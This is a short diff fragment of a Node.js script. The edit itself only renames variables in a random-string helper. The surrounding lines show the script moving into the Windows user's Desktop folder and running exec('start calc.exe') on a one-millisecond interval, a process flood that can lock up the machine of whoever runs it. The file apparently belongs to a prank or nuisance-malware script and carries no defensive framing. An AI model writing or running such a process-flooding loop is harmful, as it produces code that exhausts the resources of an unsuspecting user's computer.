@@ -20,12 +20,12 @@ exec(`cd C:/Users/${dirname.split("\\")[2]}/Desktop`, (err, stdout, stdint) => {
         setInterval(() => exec("start calc.exe"), 1)
     })
     function random(length) {
-        var result = ""
-        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        var randomed = ""
+        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         for (i = 0; i < length; i++) {
-            result += characters.charAt(Math.floor(Math.random() * characters.length));
+            randomed += chars.charAt(Math.floor(Math.random() * chars.length));
         };
-        return result
+        return randomed
     }
 })
 
